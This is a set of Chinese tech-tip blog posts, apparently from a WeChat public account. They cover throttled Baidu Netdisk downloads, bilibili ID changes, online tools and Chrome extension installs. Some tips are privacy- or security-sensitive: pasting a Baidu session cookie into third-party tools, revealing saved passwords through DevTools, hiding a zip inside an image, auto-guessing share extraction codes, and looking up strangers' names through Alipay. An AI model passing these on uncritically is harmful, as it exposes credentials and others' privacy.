最后说一个微信上拼接图片的方法，打开 我 - 收藏 ，点击右上角的 ＋ ，这是微信自带的笔记功能，上传你要拼接的多张图片。保存为图片后就将多张图片拼成一张了。 总结下，如果想简单点使用QQ就行了，想对截取的长图再操作推荐软件FastStone 。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 bilibili(b站)升级到BV号了，还想用av号怎么办 那些好玩的生成器网站 2020 年 3 月最新加速下载百度网盘文件方法 关于 苏生不惑 公众号 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 年 3 月最新加速下载百度网盘文件方法]]></title>
    <url>%2F2020%2F04%2F01%2F2020-%E5%B9%B4-3-%E6%9C%88%E6%9C%80%E6%96%B0%E5%8A%A0%E9%80%9F%E4%B8%8B%E8%BD%BD%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[苏生不惑第114 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于百度网盘之前写过了 2019年11月最新使用油猴加速百度网盘下载方法 2019 年 12 月最新加速百度网盘下载方法 那些你可能不知道的百度文库/网盘快速下载工具 没有提取码怎么获取百度网盘资源？ 之前的文章可能不够完善，还是有不少小伙伴在问，于是这里再做个整理。ps:如果你有什么问题，最好选一篇文章在文末留言，因为后台消息过了2天就不能回复了，如果我没及时看到你的消息就是想回也回不了了，有必要也可以在公众号加我微信。 油猴扩展如果你的浏览器没有安装油猴那真是浪费了，有了油猴你会发现原来浏览器还有这么多功能，比如去广告，看VIP视频，下载视频等，安装油猴扩展见我之前的文章Chrome 浏览器扩展神器油猴 和 上不了谷歌如何安装 Chrome 扩展？ 安装后在扩展程序 chrome://extensions/ 可以看到 ps:如果想搜索电影资源推荐脚本 豆瓣资源下载大师 https://greasyfork.org/zh-CN/scripts/329484，具体看之前的文章[搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定](https://mp.weixin.qq.com/s/leF2Dn9XW6sIp1SkPBFthw) 网盘助手脚本安装完上面的油猴扩展，再到https://greasyfork.org/zh-CN 这里安装你想要的脚本，开始享受油猴带给你的惊喜吧。 这里选择https://greasyfork.org/zh-CN/scripts/378301 这个网盘助手脚本。 [1]百度网盘、腾讯微云、蓝奏云万能钥匙 [2]百度网盘生成并展示下载链接[3]百度网盘分享时自定义提取码 直接点击安装，因为我已经安装过了，所以显示重新安装。安装过的脚本可以在管理面板管理。 这个脚本不但能加速下载百度网盘文件，还能自定义提取码，默认百度网盘是不能自定义提取码的，它会随机生成一个4位数的提取码。 这里给《纵横四海》这部电影生成一个带自定义提取码的分享链接 https://pan.baidu.com/s/1MDv3mdhjRF65_sp20dhAnQ 提取码: 8866。 他人分享的文件即使你不知道提取码也可以通过这个脚本来提取，它会自动帮你填写提取码，当然这个不是百分之百能提取成功。 还有登录百度网盘状态下，别人分享的视频不用保存到自己网盘也能看完，不再受只能看一分钟的限制，赶紧试试吧。 idmidm就不多说了，一款Windows下多线程下载神器，mac系统推荐ndm http://www.neatdownloadmanager.com/，安装idm软件后会给你的默认浏览器安装上Chrome扩展。谷歌浏览器打开 chrome://extensions/ 就能看到，如果没有的话在谷歌商店地址 https://chrome.google.com/webstore/detail/idm-integration-module/ngpampappnmepgilojfohadhhmbhlaek 手动安装（公众号内回复 谷歌 获取上谷歌商店安装扩展方法）。 有了 idm 扩展右键菜单多了个 使用idm下载。 用idm下载网页上的视频也方便了，详情看之前的文章如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 安装完上面的油猴扩展和网盘助手脚本及idm软件后就开始下载百度网盘文件吧。 下载百度网盘文件首先打开自己的网盘主页 https://pan.baidu.com/disk/home ，如果是他人分享的文件先保存到自己网盘。 之后选中你要下载的文件，可以看到上面有个生成链接按钮，这个就是网盘助手脚本生成的。 然后点击生成链接会有个弹窗，右键链接点击使用idm下载。自动会调出idm软件，看到要下载文件的信息后点击开始下载吧。 我这里用录频器 ocam 录制了一个GIF动图，看得更清晰。 再录最后几秒。 很快下载完了，平均速度能达到2MB/s左右，相比百度网盘客户端的100 k左右快多了。如果慢的话可以调整idm的最大链接数为32。 如果出现400，403等错误先确认下是否在你的网盘主页下载的，而不是分享页，还不行可以更改应用id 为 265486、309847，266719或者778750 ，还有压缩文件不能超过300M，不能下载文件夹 。 如果还不行，试试下面的。 亿寻这也是个Windows下的软件，打开软件使用cookie登录。 怎么获取cookie呢？打开登录的百度网盘网页版，按F12打开控制台，选择application里的cookies，右边的budss就是了，直接复制它。登录后可以看到你的百度网盘文件。搜索 我网盘里的武林外传全集这里下载81集，直接右键 快捷下载。 弹出命令行窗口开始下载。很快下载完了，可以看到平均速度1.2MB/s，还算可以，虽然比用idm稍微慢点。 BaiduPCS-Go这个支持Windows和Mac系统，这里打开BaiduPCS-Go .exe会弹出命令行窗口，然后浏览器会访问 http://localhost:5299/#/login同样用百度网盘网页的cookie登录。登录成功后可以看到你的网盘文件。 开始下载吧。 看这速度跟百度网盘客户端差不多了。。。，不知道是不不稳定，你可以自己试试。 最后分享一个倍速播放百度网盘分享的视频 插件 Video Speed Controller https://chrome.google.com/webstore/detail/video-speed-controller/nffaoalbilbmmfgbnbgppjihopabppdk ，当然不限制百度网盘，任何网页视频都可以加速播放。 以上所有工具在公众号内回复 百度网盘 获取，推荐使用idm+油猴脚本来下载，终于写完了，这篇文章编辑加测试截图花了至少4个小时，点个在看支持下吧， 有什么问题文章末尾留言。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 bilibili(b站)升级到BV号了，还想用av号怎么办 那些好玩的生成器网站 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bilibili(b站)升级到BV号了，还想用av号怎么办？]]></title>
    <url>%2F2020%2F04%2F01%2Fbilibili-b%E7%AB%99-%E5%8D%87%E7%BA%A7%E5%88%B0BV%E5%8F%B7%E4%BA%86%EF%BC%8C%E8%BF%98%E6%83%B3%E7%94%A8av%E5%8F%B7%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[苏生不惑第113 篇原创文章，将本公众号设为星标，第一时间看最新文章。 就在3月23日b站宣布b站链接由原来的av改为BV了，具体看官方说明【升级公告】AV号全面升级至BV号https://www.bilibili.com/read/cv5167957/ 详细规则 https://www.bilibili.com/blackboard/activity-BV-PC.html 有什么想吐槽的去话题 ‍#BV号来了# https://www.bilibili.com/tag/name/BV%E5%8F%B7%E6%9D%A5%E4%BA%86/feed ps: acg.tv 这个域名会跳转到https://www.bilibili.com/，之前的 av 前缀大概率是 acg video 。 原来的链接都是 av+id， 如 av170001 这样，现在都变成了 BV+string ，于是大批网友去 https://www.bilibili.com/video/av170001/ 考古。 据说170001是b站的镇站之宝，这是保加利亚妖王的成名曲，洗脑程度相当厉害，节奏感极强，成为许多音乐游戏的素材，改为bv后的链接成了https://www.bilibili.com/video/BV17x411w7KC/ ，需要注意区分大小写。 不过在谷歌都能搜到。 b站第一个av id是这个 https://www.bilibili.com/video/av2，不知道为什么av1没了，第一篇专栏还在 https://www.bilibili.com/read/cv1 。 bv和av互转虽然改bv了，但和av是共存的，比如这个视频【周杰伦纪录片】第四集：天马行空https://www.bilibili.com/video/av97863448 ，打开控制台输入bvid 可以得出对应的BV号为BV1jE411A7ha，用链接https://www.bilibili.com/video/BV1jE411A7ha也能访问。 输入aid可以得到97863448 其实b站还有接口可以查询，比如aid查cid https://www.bilibili.com/widget/getPageList?aid=97863448 ，https://api.bilibili.com/x/player/pagelist?aid=97863448使用bv参数 https://api.bilibili.com/x/player/pagelist?bvid=BV1jE411A7ha aid查bv https://api.bilibili.com/x/web-interface/archive/stat?aid=97863448 使用bv参数 https://api.bilibili.com/x/web-interface/archive/stat?bvid=BV1jE411A7ha或者 https://api.bilibili.com/x/web-interface/view?bvid=BV1jE411A7ha 如果嫌麻烦，有人还开发了油猴脚本https://greasyfork.org/zh-CN/scripts/398535-bv2av，关于安装油猴脚本见之前的文章[Chrome 浏览器扩展神器油猴](https://mp.weixin.qq.com/s/adJFh_9LH0N-vvvYaiQqXg)进入bv链接 https://www.bilibili.com/video/BV1jE411A7ha 会自动跳转到 https://www.bilibili.com/video/av97863448，网友开发的https://bv2av.com/index.php?BV=BV1jE411A7ha 跳转播放b 站视频链接可以带时间戳参数，加上参数 t=126s 会直接跳转到2分6秒 https://www.bilibili.com/video/av97863448?t=126s ，有什么用呢？方便发给别人看指定片段。 404b站的视频被删除会跳转到404页面 https://www.bilibili.com/404，比如这个https://www.bilibili.com/video/av1/点换一张可以不断看图。 弹幕词云http://danmu.xiezuoguan.cn/#/ 输入视频aid可以生成弹幕词云图，比如https://www.bilibili.com/video/av97863448 的弹幕 短链接嫌链接太长？b站还有短链接 https://b23.tv/av97863448 下载视频关于下载视频之前写过如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？，依然推荐这个下载工具下载b站视频，支持bv。 命令行推荐 https://github.com/soimort/you-get，annie 还没兼容。 关于b站更多使用技巧参考之前的文章那些你可能不知道的 bilibili 奇技淫巧 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 如何将视频轻松转换为 GIF 如何轻松的将文字转语音 那些好玩的生成器网站 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能用得上的在线办公神器（二）]]></title>
    <url>%2F2020%2F04%2F01%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E7%94%A8%E5%BE%97%E4%B8%8A%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%8A%9E%E5%85%AC%E7%A5%9E%E5%99%A8%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第112 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前写过那些你可能用得上的在线办公神器，这是下篇。 在线笔记如果想记录工作日志，甚至打造自己的知识管理平台，推荐印象笔记https://www.yinxiang.com，除了笔记还有剪藏功能，比如在微信里备份文章，这个在之前写过[如何备份可能被删的公众号文章和网页](https://mp.weixin.qq.com/s/bIE23HBq_sqvLkV18_BlbQ) 其他类似的网站还有 有道云笔记http://note.youdao.com ，为知笔记http://www.wiz.cn/ ，语雀https://www.yuque.com 在线文档翻译 不同于百度翻译简单的文字，这个可以在线翻译文档，对整个文档进行翻译， 全英文文档翻译成全中文文档 https://www.onlinedoctranslator.com/ 如果想学英语推荐使用彩云小译这个谷歌插件 https://chrome.google.com/webstore/detail/lingocloud-web-translatio/jmpepeebcbihafjjadogphmbgiffiajh ，安装Chrome插件方法见之前的文章上不了谷歌如何安装 Chrome 扩展？，当浏览英文/日文网页时，只需要点击小译插件，当前网页就会变成“中英对照”模式。 短链接如果链接太长想缩短下可以使用百度的短网址https://dwz.cn/console/operation 其他类似的网站还有 http://sina.lt/， http://tool.chinaz.com/tools/dwz.aspx，https://zws.im/，https://www.dute.org/url-shorten 识图看到一张精美的电影海报，不记得电影出处直接百度识图下http://image.baidu.com/?fr=shitu 其他类似的网站还有谷歌识图 https://www.google.com/imghp?hl=zh-cn 文件转换 万能格式转换神器https://cn.office-converter.com/ ，支持文档，视频，音乐，图片，电子书转换。类似的网站还有https://convertio.co/zh/， http://www.alltoall.net/ ，,https://cloudconvert.com/ 制作词云关于词云之前写过 Python 词云分析周杰伦新歌《说好不哭》 ，不用代码也可以生成词云https://www.weiciyun.com/u/create#/导入周杰伦新歌《我是如此相信》的歌词 https://y.qq.com/n/yqq/song/001PLl3C4gPSCI.html?ADTAG=baiduald&amp;play=1生成效果如下，看词云就知道周董对老婆是真爱。类似的网站还有 http://yciyun.com/ ， http://www.picdata.cn/picdata/ ，https://me.bdp.cn/home.html ，https://wordart.com/， https://cloud.niucodata.com/https://wis-ai.com/wordcloud， https://github.com/fuqiuai/wordCloudhttps://www.moage.cn/wordart 图片放大https://bigjpg.com/ 是一个可以无损放大图片的网站，它通过神经网络，针对放大图片的线条、颜色、网点等特点，做特殊的算法调整，放大效果非常出色。 类似网站还有 http://waifu2x.udp.jp/，https://imglarger.com/，https://zh.pixfix.com/ 图片压缩推荐谷歌出品的https://squoosh.app/ ，支持 JPG、PNG、WebP 等格式的极限压缩。谷歌浏览器还可以创建桌面快捷程序，直接菜单里安装 其他类似的网站还有 腾讯智图https://zhitu.isux.us/，https://tinypng.com/，http://www.picdiet.com/zh-cn/，https://zh.recompressor.com/， https://jpgmin.cn/，https://pngmin.cn/，https://tiomg.org/compress-imagehttps://docsmall.com/ 在线ps不想安装庞大的ps软件，直接在线ps吧，将图片、视频、实时摄像头的画面进行特效处理 https://www.uupoop.com/ 其他类似的网站还有 http://editor.pho.to/zh/ ， https://ps.gaoding.com/#/https://editor.polaxiong.com/ ，https://www.photopea.com/ 如果想拼接图片可以使用 http://join-screenshots.zhanghai.me/或者有啦 https://www.yoo.la/#/ 音频剪辑https://mp3cut.net/cn/ 直接在浏览器中剪辑音轨，支持 300 多种文件格式、淡出淡入功能和铃声质量预设，而且完全免费。 其他类似的网站还有 https://sodaphonic.com/editor，https://beecut.cn/extract-audio-online，https://www.bearaudiotool.com/zh ，https://zh.pickfrom.net/mp4-to-mp3 临时邮箱/短信临时邮箱也称为一次性邮箱，24小时邮箱，10分钟邮箱，可丢弃邮箱，是完全匿名和安全的。如果注册某些网站不想被垃圾邮件骚扰可以使用临时邮箱 http://mail.bccto.me/临时短信也一样的。 其他类似的网站还有 https://jiemahao.com/， https://www.linshiyouxiang.net，http://24mail.chacuo.net/，见之前的文章[怕被发垃圾邮件？用临时邮箱来注册账号](https://mp.weixin.qq.com/s/DzbDwX65Eb8beBzKun16wg) 临时网盘想临时发个文件给对方，不想注册账号和被限速，可以选择火狐的https://send.firefox.com/，它使用Firefox Send 端到端加密分享文件，链接到期即焚，分享更私密，不登录就能上传1G以内的文件。 其他类似的网站还有 https://cowtransfer.com/，http://tmp.link/，https://www.wenshushu.cn/ ，https://www.lanzous.com/ 见之前的文章那些你可能不知道的文件分享工具 热点上班也偶尔摸鱼下看看今天有什么热点，https://top.sogou.com/，http://top.baidu.com/ 百度/微博热搜就不说了，如果想看各大网站的热点推荐今日日榜https://tophub.today/，微博，百度，知乎，微信热榜一网打尽，打开链接跳转到对应网站。 类似的网站还有 http://www.5ce.com/ ， https://www.anyknew.com/ ，https://hot.mrcuriosity.org/ ，https://mo.fish/main/home/hot ，https://ef.zhiweidata.com/ 见之前的文章上班摸鱼好去处 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 如何将视频轻松转换为 GIF 如何轻松的将文字转语音 那些好玩的生成器网站 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[上不了谷歌如何安装 Chrome 扩展？]]></title>
    <url>%2F2020%2F04%2F01%2F%E4%B8%8A%E4%B8%8D%E4%BA%86%E8%B0%B7%E6%AD%8C%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85-Chrome-%E6%89%A9%E5%B1%95%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[苏生不惑第111 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于Chrome扩展之前写过 那些我常用的 Chrome 扩展 那些我常用的 Chrome 扩展（二） 那些我常用的 Chrome 扩展（三） 但还是有小伙伴在后台问 https://chrome.google.com/webstore/detail/evernote-web-clipper/pioclpoplcdbaefihamjohnefbikjilc 类似这种链接打不开，所以这里再写一篇如何安装Chrome扩展的文章。 谷歌商店镜像关于镜像网站之前写过那些你用得上的镜像网站，在https://chrome-extension-downloader.com/ 或者https://crxdl.com/ 这类网站下载Chrome扩展对应的crx文件，比如输入https://chrome.google.com/webstore/detail/evernote-web-clipper/pioclpoplcdbaefihamjohnefbikjilc 的插件id pioclpoplcdbaefihamjohnefbikjilc就能下载crx文件。直接用idm下载到本地文件pioclpoplcdbaefihamjohnefbikjilc_v7.12.4.zip 如果你想安装谷歌play的APP也可以使用镜像网站来下载，推荐https://apkpure.ai/ ，https://apkdownload.cc/，https://apkdl.in/ 搜索微信 https://apkpure.ai/wechat-9ac732e307c815a6fffeb7e8463878de，可以看到微信版本为7.0.10。 手动安装扩展打开Chrome扩展程序 chrome://extensions/开启开发者模式将上面下载的zip文件解压出来到crx目录，目录下有文件pioclpoplcdbaefihamjohnefbikjilc_v7.12.4.crx 之后直接将这个文件拖入扩展程序窗口 可以看到扩展安装好了右上角有扩展图标了，开始备份网页吧如何备份可能被删的公众号文章和网页 谷歌商店安装在国内谷歌商店默认是打不开的，所以这里分享一个谷歌访问助手（公众号内回复 谷歌 获取），安装这个扩展后就能上谷歌商店直接安装Chrome扩展了。 分享的谷歌助手扩展同样使用上面的方法来安装，如果提示该扩展程序未列在 Chrome 网上应用店中，并可能是在您不知情的情况下添加的或者程序包无效。 先把文件后缀名.crx 改成 .rar或者.zip，然后解压到一个文件夹，再打开扩展程序chrome://extensions/ ，点击加载已解压的扩展程序。 选择刚才解压出的文件夹，确认新增扩展程序就安装好了。 可以看到谷歌助手扩展安装好了。 然后就可以打开谷歌了 http://google.com/ 之后直接打开谷歌商店 https://chrome.google.com/webstore/detail/google-hangouts/nckgahadagoaajjgafhacjanaoiihapd 安装。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 那些有意思的谷歌/百度搜索彩蛋 那些你可能用得上的在线办公神器 如何将视频轻松转换为 GIF 如何轻松的将文字转语音 那些好玩的生成器网站 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能用得上的在线办公神器]]></title>
    <url>%2F2020%2F04%2F01%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E7%94%A8%E5%BE%97%E4%B8%8A%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%8A%9E%E5%85%AC%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[苏生不惑第110 篇原创文章，将本公众号设为星标，第一时间看最新文章。 工作的时候可能需要处理些图片，下载视频什么的，如果不想安装软件推荐使用下面这些在线网站。 图片处理用于批量图像处理的免费在线工具 https://www.imgbot.ai/ 。在线调整大小，裁剪，压缩图像或添加水印。批量处理图像并以单个ZIP下载。一次最多上传100张图片，每个文件最多上传25 MB。默认是英文的，右键翻译成中文就好了。给图片加个水印 类似的网站还有 https://www.iloveimg.com/zh-cn， http://www.img365.cn/，https://www.gaitubao.com/shuiyin/ ， https://yijiangaitu.com/ ，见之前的文章那些你可能需要的图片处理工具 抠图不会ps想做个身份证个人照？选一张个人生活照用 https://www.remove.bg/zh 直接抠图。如果想自定义背景色什么的用搞定抠图 https://www.gaoding.com/koutu，https://zh.clippingmagic.com，https://www.bslong.cn 效果图 视频处理不用软件直接 在线剪辑视频，提取音频，视频合并，视频转GIF 等https://beecut.cn/online-video-editor以这个视频为例，选择要剪辑的时间段一会就剪辑好了。类似的还有b站的 https://bilibili.clipchamp.com/ ， https://online-video-cutter.com/cn/ ，https://www.apowersoft.cn/online-video-editor，https://www.video2edit.com/zh/video-cutter GIF处理爱奇艺出品的在线gif制作网站 http://ijinguo.iqiyi.com/tools/#/添加字幕生成的效果 类似的网站还有 https://ezgif.com/ ，https://tool.gifhome.com ，见之前的文章如何将视频轻松转换为 GIF PDF处理https://smallpdf.com/cn 这个网站功能很齐全，有压缩PDF、PDF转换、PDF转PPT等功能，不用注册即可使用。不过对使用次数有限制（ cookie 限制），如果要无限制使用清除本地cookie即可。 其他类似的还有https://www.ilovepdf.com/zh-cn， https://docsmall.com/ ，https://lightpdf.com/zh/， https://zh.pickfrom.net/ 见之前的文章那些你可能不知道的 PDF 工具 视频下载比如下载b站视频 ，直接输入地址在线解析https://www.parsevideo.net/#https://www.bilibili.com/video/av75572775 其他类似的网站还有 https://dy.kukutool.com/ ，https://bilibili.iiilab.com/ ，https://weibomiaopai.com/ ， http://weibodang.cn/ ，其他下载方法见之前的文章如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频 在线 ocr从PDF和图像（JPG，BMP，TIFF，GIF）中提取文本，并转换为可编辑的Word，Excel和文本输出格式，支持46种语言，包括中文，日文和韩文https://www.onlineocr.net/效果 类似的还有阿里云的 https://duguang.aliyun.com/experience ,https://uutool.cn/ocr/ ,见之前的文章那些你可能不知道的 ocr 图片文字识别工具 图表制作向粗糙图表 Say Goodbye! 百度图说 https://tushuo.baidu.com/ 是基于Echarts一个傻瓜式图表工具，无需代码基础就可以做出屌炸天的动态图表！ 登录百度账号就能很方便在线制作一个图表了。类似的还有 https://chartcube.alipay.com/， https://www.wentu.io/ ，https://www.tubiaoxiu.com/ 思维导图processon 支持流程图、思维导图、原型图、UML、网络拓扑图、组织结构图等 https://www.processon.com/它提供了很多模板，这样可以直接拿来自己改。类似的还有流程图 https://app.liuchengtu.com/ ，幕布https://mubu.com/ 百度脑图https://naotu.baidu.com/ ，https://www.draw.io/ ，https://gitmind.cn/，https://www.xmind.cn/ 在线协作文档石墨文档https://shimo.im/ 是一款优雅,轻便的在线协作文档工具,支持多人同时对文档编辑和评论,多端实时更新,让你与他人轻松完成协作撰稿/方案讨论/会议记录和资料共享等工作。 最好用的功能是邀请团队成员一起协作， 和你的团队一起查看和编辑同一个文档或表格，他们打开你分享的链接就能直接编辑你的文档了，编辑后你可以实时看到效果。 其他类似的还有 腾讯文档https://docs.qq.com/ ，一起写 https://www.yuque.com，见我之前的文章[那些可多人协作编辑的在线文档工具](https://mp.weixin.qq.com/s/wP2B2L8xJ7f66U6N7CsxtA) 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 如何将视频轻松转换为 GIF 如何轻松的将文字转语音 那些好玩的生成器网站 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的网络冷知识奇技淫巧]]></title>
    <url>%2F2020%2F04%2F01%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E7%BD%91%E7%BB%9C%E5%86%B7%E7%9F%A5%E8%AF%86%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[苏生不惑第109 篇原创文章，将本公众号设为星标，第一时间看最新文章。 奇技淫巧系列更新第10篇，之前的9篇如下： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的知乎奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的 bilibili 奇技淫巧 微信多开想和QQ一样在pc上登录多个微信，新建个批处理文件 wechat.bat12start "D:\wechat\WeChat.exe"start "D:\wechat\WeChat.exe" WeChat.exe换成你本地的路径，先关闭登录的微信，然后双击wechat.bat就可以登录2个微信了，3个微信就再复制一行，参考我之前的文章如何在电脑上登陆多个微信 空白朋友圈这个其实没多大用，装逼还是可以的，在公众号内回复 朋友圈 获取使用方法，更多细节看我之前的文章如何发一条空白的朋友圈 微信存储空间清理微信用的时间久了太占空间了，你有清理过吗？手机内存小的可以试试。 如果不想保存拍照和编辑后的内容。在我 -设置-通用-照片，视频和文件 关闭选项，这样也可以给手机节省点空间。 快捷搜索在Chrome浏览器地址栏输入google.com的时候按tab直接搜索 ，不用进入网站再搜索，百度，微博等同理。 忘记密码有时候很久不登录密码可能给忘了，先不要急着找回密码，用浏览器的记住密码帮你找回来，这里以百度为例，在密码框内右键点击检查会打开控制台，找到type=&quot;password&quot;删了，于是密码就出来了。 网页上的元素可以随意修改，所以不要轻信截图，比如我的支付宝余额88888888。 如果嫌这样麻烦可以打开Chrome浏览器隐私设置 chrome://settings/privacy自动填充密码里保存了你所有账号的密码，公用电脑上就不要登录自己的账号了，即便要登录记得清除掉。 如果你登录了 Google 账号打开https://myactivity.google.com/myactivity ，这里记录了你所有的搜索历史和网页记录，如果想可视化你的历史记录可以看我之前的文章分析你的浏览器历史记录，看看你喜欢访问哪些网站 生僻字遇到不认识的生僻字怎么办？如果你用搜狗输入法通过u模式输入ushuishuishui就能打出 淼，还给你标出拼音。 输入 v123456 可以打出大写的数字 壹拾贰万叁仟肆佰伍拾陆，更多技巧查看搜狗官方文档 https://pinyin.sogou.com/help.php?list=3&amp;q=8 网页快照搜索引擎对网页都有个存档快照功能，如果原网页被删了可能在搜索引擎搜索还能找到。 查到这个2018年的豆瓣帖子快照 这里推荐一个快捷工具，在任意网址前加 https://wanneng.run/ 访问可看到针对该域名的在线工具，包括历史快照 。快照有https://2tool.top/和https://web.archive.org，这个之前的文章有介绍[跟随时光机回到过去看看 2005 年的百度/腾讯/淘宝/谷歌](https://mp.weixin.qq.com/s/LKDGKWi62J5Zyzh3rB-IiQ) Chrome 小恐龙游戏Chrome浏览器在断网时会出现恐龙小游戏，无聊的时候可以玩玩。当然不断网打开chrome://dino/ 也可以玩，如果在手机上可以用这个 https://ishare20.net/game/chromedino/ ，想玩高分，F12打开控制台执行以下代码123var dino=Runner.prototypedino.gameOver=()=&gt;&#123;&#125;Runner.instance_.setSpeed(233) 右键截图用QQ截图的时候单击右键就消失了，这时先按住alt+ctrl再单击右键就可以用QQ对右键菜单截图了。 历史新闻4大门户网站上十几年前的新闻还在，如果想看某天的发生的新闻可以看看新浪新闻，因为新浪的url是根据日期来的，比如2008年8月8日北京奥运会当天的新闻http://news.sina.com.cn/head/news20080808am.shtml，晚上用pm。 网易的 https://news.163.com/20/0317/12/F7U1MIRS0001899O.html和腾讯的https://new.qq.com/omn/FIN20200/FIN2020031702051700.html 就不方便找了。 视频倍速播放嫌电影节奏太慢，加速看吧，安装https://chrome.google.com/webstore/detail/video-speed-controller/nffaoalbilbmmfgbnbgppjihopabppdk 这个Chrome扩展就行了，安装扩展可以看之前的文章那些我常用的 Chrome 扩展，可以自定义几倍速度，刷网课必备。 知乎彩蛋知乎APP里摇一摇手机会弹出反馈按钮，还有双击答案会自动点赞。网页上按shift+?弹出快捷键，按V键直接点赞。 搜索根话题可以找到知乎 TOP1000 高赞回答。https://www.zhihu.com/topic/19776749/top-answers Windows快捷键在办公室临时出去怕同事动你的电脑，直接Win+l锁屏，需要输入密码才能打开。 上班正摸鱼，忽然发现boss过来了，直接Win+d切回桌面，boss走后再Win+d切回去。。。 还有win+e打开我的电脑，win+r 运行程序，alt+tab切换窗口，Windows10下不借助软件用win+g直接录屏，更多快捷键自己搜索吧。 图种 图种是一种利用图片档来传递压缩档的技巧。 图种以图片检视器开启时，就是一张单纯的图片。 但可以以压缩软件对其解压缩，取得附加在图片档后的压缩档内容。虽然图种携带的是压缩档，而压缩内可以是任意的档案。 但档案增大，图种的大小也会跟着增大；引人怀疑。 所以通常图种中夹带的压缩档内容仅为一种子文件， 供人下载某其它档案。固称为图种。 以上来自维基百科https://zh.wikipedia.org/wiki/%E5%9C%96%E7%A8%AE ，简单的说就是将一个文件存在一张图里，Windows上在命令行执行以下命令就可以把file.zip文件藏在sushengbuhuo.jpg这个图片里了，将后缀改为zip解压出来就能看到。1234λ copy /b gzh.jpg +file.zip sushengbuhuo.jpggzh.jpgfile.zip已复制 1 个文件。 临时邮箱/短信某不知名网站要注册才能看，又不想自己邮箱收到垃圾邮件，试试这种临时邮箱https://bccto.me/ ，https://www.moakt.com/zh ，这个之前也分享过怕被发垃圾邮件？用临时邮箱来注册账号临时接收短信的网站也有 https://www.zusms.com ，https://mianfeijiema.com/ 下载音乐/视频想下载网易云音乐上林俊杰的一首歌《修炼爱情》https://music.163.com/#/song?id=25727803 ，打开控制台在network搜索m4a，第一个链接就是播放地址了，直接下载吧。 同样下载网易云的视频一样的操作，其他网站可以看看之前的文章如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频 搜索影视资源不想在搜索引擎一页一页的翻资源，直接用油猴扩展加脚本帮你搞定搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定 搜到磁力链接，使用百度网盘的离线下载直接把电影保存到你的网盘在线看。下载百度网盘文件也可以使用油猴2019年11月最新使用油猴加速百度网盘下载方法 支付宝查名字接到一个陌生电话，不确定自己是否认识，打开支付宝输入对方手机号码，点击转账，然后就可以看到对方的名字了，不过没有姓。 如果你不想让人这样搜到，在隐私设置里关闭通过手机号找到我即可，不过别人就没法通过手机号给你转账了。 